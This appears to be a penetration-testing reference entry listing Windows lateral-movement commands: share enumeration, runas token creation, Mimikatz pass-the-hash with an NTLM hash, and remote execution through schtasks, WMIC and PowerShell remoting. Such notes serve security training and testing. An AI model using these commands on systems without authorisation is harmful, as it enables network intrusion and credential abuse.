# Windows Lateral Movement

**Description:** This entry describes how to use various commands for lateral movement

**Requirements:** required software

## Commands to perform lateral movement

```
dir \\host\c$
```

Check to see if your admin on another computer by listing the c$ share

```
net view \\<share>
```

Net command to check remote files

```
runas /user:Domain\(user) something.exe
```

Create a token with creds from command line

```
runas /user:Domain\(user) /netonly something.exe
```

Create a token to pass creds

```
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND
```

Pass the hash with Mimikatz

```
SCHTASKS /Run /S system /U user /P password /I /TN "taskname"
```

Run task immediately on remote system

```
wmic /node:(host) process call create <path to exe>
```

Run exe on remote computer with WMIC

```powershell
Powershell Invoke-Command -ComputerName (host) -ScriptBlock { dir c:\ }
```

WinRM(port 5985) turned off by default(turned on for administration) Run command with Windows remoting
  
## References
* none